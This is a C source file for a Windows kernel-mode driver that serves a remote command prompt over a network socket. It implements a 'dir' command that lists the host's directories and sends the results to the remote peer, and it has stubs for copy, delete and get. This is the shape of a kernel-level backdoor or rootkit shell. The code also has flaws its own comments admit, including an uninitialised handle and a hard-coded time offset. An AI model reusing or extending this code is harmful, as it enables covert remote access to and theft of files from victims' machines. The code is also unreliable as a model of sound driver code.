///
//	uty@uaty
///
#include <ntddk.h>
#include "utils.h"
#include "socket.h"


//--------------------------------------------------------------------
typedef struct _FILE_DIRECTORY_INFORMATION { // Information Class 1
	ULONG NextEntryOffset;
	ULONG Unknown;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;
//--------------------------------------------------------------------
struct file_pAcket
{
	unsigned long	sign;//0xAABBCCDD
	LARGE_INTEGER	totAlsize;
	LARGE_INTEGER	offset;
	unsigned long	length;
	unsigned long	filenAme_length;
	char			filenAme[0];
};
//--------------------------------------------------------------------
NTSYSAPI
NTSTATUS
NTAPI
ZwQueryDirectoryFile(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG FileInformationLength,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan
	);

NTSYSAPI
NTSTATUS
NTAPI
ZwDeleteFile(
	IN POBJECT_ATTRIBUTES ObjectAttributes
	);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetInformationFile(
    IN HANDLE  FileHandle,
    OUT PIO_STATUS_BLOCK  IoStatusBlock,
    IN PVOID  FileInformation,
    IN ULONG  Length,
    IN FILE_INFORMATION_CLASS  FileInformationClass
    );

NTSYSAPI
NTSTATUS
NTAPI
ZwWriteFile(
	IN HANDLE  FileHandle,
	IN HANDLE  Event  OPTIONAL,
	IN PIO_APC_ROUTINE  ApcRoutine  OPTIONAL,
	IN PVOID  ApcContext  OPTIONAL,
	OUT PIO_STATUS_BLOCK  IoStatusBlock,
	IN PVOID  Buffer,
	IN ULONG  Length,
	IN PLARGE_INTEGER  ByteOffset  OPTIONAL,
	IN PULONG  Key  OPTIONAL
	);

NTSYSAPI
NTSTATUS
NTAPI 
ZwReadFile(
	IN HANDLE  FileHandle,
	IN HANDLE  Event  OPTIONAL,
	IN PIO_APC_ROUTINE  ApcRoutine  OPTIONAL,
	IN PVOID  ApcContext  OPTIONAL,
	OUT PIO_STATUS_BLOCK  IoStatusBlock,
	OUT PVOID  Buffer,
	IN ULONG  Length,
	IN PLARGE_INTEGER  ByteOffset  OPTIONAL,
	IN PULONG  Key  OPTIONAL
	);

NTSYSAPI
NTSTATUS
NTAPI 
  ZwQueryInformationFile(
    IN HANDLE  FileHandle,
    OUT PIO_STATUS_BLOCK  IoStatusBlock,
    OUT PVOID  FileInformation,
    IN ULONG  Length,
    IN FILE_INFORMATION_CLASS  FileInformationClass
    );

int sprintf(char *, const char *, ...);
//--------------------------------------------------------------------
NTSTATUS
commAnd_dir(
	struct sock*	psock,
	ULONG	Argc,
	CHAR*	Argv[]
	)
{
	HANDLE					hFileHAndle;
	OBJECT_ATTRIBUTES		oA;
	IO_STATUS_BLOCK			IoStAtusBlock; 
	#define INFO_BUFFER_LENGTH		1024
	CHAR					*InforBuffer;
	WCHAR					*tempbuff_w;
	CHAR					*tempbuff_A;
	CHAR					*formAtbuff;
	CHAR					*sendbuff;
	WCHAR					*pAth;
	PFILE_DIRECTORY_INFORMATION		pInfor;
	UNICODE_STRING			nAme;
	NTSTATUS				dwStAtus;
	ULONG					len = 0;
	BOOLEAN					dAtAleft = FALSE;
	char					filelengthstring[50] = {0};


	TIME_FIELDS				time;

	//debug
	DbgPrint("Argc: %d\n",Argc);
	//


	InforBuffer	= ExAllocatePool(PagedPool,INFO_BUFFER_LENGTH);
	pAth		= ExAllocatePool(PagedPool,1024);
	sendbuff	= ExAllocatePool(PagedPool,1024);
	tempbuff_w	= ExAllocatePool(PagedPool,2048);
	tempbuff_A	= ExAllocatePool(PagedPool,1024);
	formAtbuff	= ExAllocatePool(PagedPool,1024);

	RtlZeroMemory(sendbuff,1024);
	RtlZeroMemory(pAth,1024);

	if (Argc == 1){
		RtlCopyMemory(pAth,L"\\??\\c:\\",sizeof(L"\\??\\c:\\"));
	} else if (Argc > 2){
		goto end_commAnd_dir;
	} else{
		RtlCopyMemory(pAth,L"\\??\\",sizeof(L"\\??\\"));
		Atow(Argv[1],&pAth[4]);
		//debug
		DbgPrint("dir pAth: %S\n",pAth);
		//
	}


	RtlInitUnicodeString(&nAme,pAth);
	InitializeObjectAttributes(
							&oA,
							&nAme,
							OBJ_CASE_INSENSITIVE,
							NULL,
							NULL
							);
	
	dwStAtus = ZwOpenFile(
						&hFileHAndle,
						GENERIC_READ,
						&oA,
						&IoStAtusBlock,
						FILE_SHARE_READ,
						FILE_DIRECTORY_FILE
						);

	if(/*dwStAtus == STATUS_PENDING && */IoStAtusBlock.Status != STATUS_SUCCESS){///需要改进
		send(psock,"no such directory\n",18);
		goto end_commAnd_dir;
	}

	do{
		if (dAtAleft){
			dAtAleft = FALSE;
			RtlZeroMemory(sendbuff,1024);
			strcat(sendbuff,formAtbuff);
			len += strlen(formAtbuff);
		}


		RtlZeroMemory(InforBuffer,INFO_BUFFER_LENGTH);
		dwStAtus = ZwQueryDirectoryFile(	
			hFileHAndle,
			NULL,//hDirEvent,
			NULL,
			NULL,
			&IoStAtusBlock,
			InforBuffer,
			INFO_BUFFER_LENGTH,
			FileDirectoryInformation,
			FALSE,
			NULL,
			FALSE
			);

		if (IoStAtusBlock.Status != STATUS_SUCCESS ){//bug
			goto send_left_dAtA;
		}

		pInfor = (PFILE_DIRECTORY_INFORMATION)InforBuffer;

		RtlZeroMemory(tempbuff_w,2048);
		RtlCopyMemory(tempbuff_w,(char*)pInfor->FileName,pInfor->FileNameLength);
		


		//RtlZeroMemory(sendbuff,1024);
		RtlZeroMemory(tempbuff_A,1024);
		wtoA(tempbuff_w,tempbuff_A);
		//strcat(tempbuff_A,"\n");
		RtlTimeToTimeFields(&pInfor->CreationTime,&time);
		if ((pInfor->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0){
			lArge2string(pInfor->EndOfFile,filelengthstring,50);
		} else{
			memset(filelengthstring,0,sizeof(filelengthstring));
		}
		sprintf(formAtbuff,"%d-%02d-%02d  %02d:%02d    %5s%12s %s\n",	
			time.Year,time.Month,time.Day,time.Hour+8,time.Minute,		//好象还有时差-___-
			(pInfor->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)?"<DIR>":"",
			filelengthstring,///bug
			tempbuff_A
			);
		//send(psock,sendbuff,strlen(sendbuff));
		//debug
		DbgPrint("len: %d\n",len);
		//
		if (len + strlen(formAtbuff) < 1024){
			len += strlen(formAtbuff);
			strcat(sendbuff,formAtbuff);
			RtlZeroMemory(formAtbuff,1024);
		} else{
			dAtAleft = TRUE;
			len = 0;
			send(psock,sendbuff,strlen(sendbuff));
		}

		do{
			if (dAtAleft){
				dAtAleft = FALSE;
				RtlZeroMemory(sendbuff,1024);
				strcat(sendbuff,formAtbuff);
				len += strlen(formAtbuff);
			}

			pInfor = (PFILE_DIRECTORY_INFORMATION)((PCHAR)pInfor + pInfor->NextEntryOffset);
			RtlZeroMemory(tempbuff_w,2048);
			RtlCopyMemory(tempbuff_w,(char*)pInfor->FileName,pInfor->FileNameLength);
			

			//RtlZeroMemory(sendbuff,1024);
			RtlZeroMemory(tempbuff_A,1024);
			wtoA(tempbuff_w,tempbuff_A);
			//strcat(tempbuff_A,"\n");
			RtlTimeToTimeFields(&pInfor->CreationTime,&time);
			if ((pInfor->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0){
				lArge2string(pInfor->EndOfFile,filelengthstring,50);
			} else{
				memset(filelengthstring,0,sizeof(filelengthstring));
			}
			sprintf(formAtbuff,"%d-%02d-%02d  %02d:%02d    %5s%12s %s\n",	
				time.Year,time.Month,time.Day,time.Hour+8,time.Minute,		//好象还有时差-___-
				(pInfor->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)?"<DIR>":"",
				filelengthstring,///bug
				tempbuff_A
				);

			//send(psock,sendbuff,strlen(sendbuff));
			//debug
			DbgPrint("len: %d\n",len);
			//
			if (len + strlen(formAtbuff) < 1024){
				len += strlen(formAtbuff);
				strcat(sendbuff,formAtbuff);
				RtlZeroMemory(formAtbuff,1024);
			} else{
				dAtAleft = TRUE;
				len = 0;
				send(psock,sendbuff,strlen(sendbuff));
			}
		}while(pInfor->NextEntryOffset != 0);
	}while(IoStAtusBlock.Status != STATUS_NO_MORE_FILES);


send_left_dAtA:
	if (len > 0){
		send(psock,sendbuff,strlen(sendbuff));
	}
end_commAnd_dir:

	if(hFileHAndle){
		ZwClose(hFileHAndle);
	}
	
	ExFreePool(sendbuff);
	ExFreePool(InforBuffer);
	ExFreePool(tempbuff_w);
	ExFreePool(tempbuff_A);
	ExFreePool(formAtbuff);
	ExFreePool(pAth);

	return STATUS_SUCCESS;
}
//--------------------------------------------------------------------
NTSTATUS
ReferenceCommAnd(struct sock* psock,CHAR* commAndline)
{
	CHAR* usAge =	"some commAnds:\n"
					" dir	\n"
					" copy	\n"
					" del	\n"
					" get	\n"
					"		\n";
	ULONG		Argc;
	CHAR*		Argv[9];


	commAndline[strlen(commAndline) - 1] = '\0';

	GetArg(commAndline,&Argc,Argv,9);

	if (0 == _stricmp(Argv[0],"help")){
		send(psock,usAge,strlen(usAge));
	} else if (_stricmp(Argv[0],"dir") == 0){
		commAnd_dir(psock,Argc,Argv);
	} else if (_stricmp(Argv[0],"copy") == 0){
		//commAnd_copy(psock,Argc,Argv);
	} else if (_stricmp(Argv[0],"del") == 0){
		//commAnd_del(psock,Argc,Argv);
	} else if (_stricmp(Argv[0],"get") == 0){
		//commAnd_get(psock,Argc,Argv);
	} else if (_stricmp(Argv[0],"") == 0){
		//for just "enter",do nothing
	} else {
		send(psock,"bAd commAnd.\n",13);
	}
	send(psock,"COMMAND >",strlen("COMMAND >"));
	return STATUS_SUCCESS;
}
//--------------------------------------------------------------------

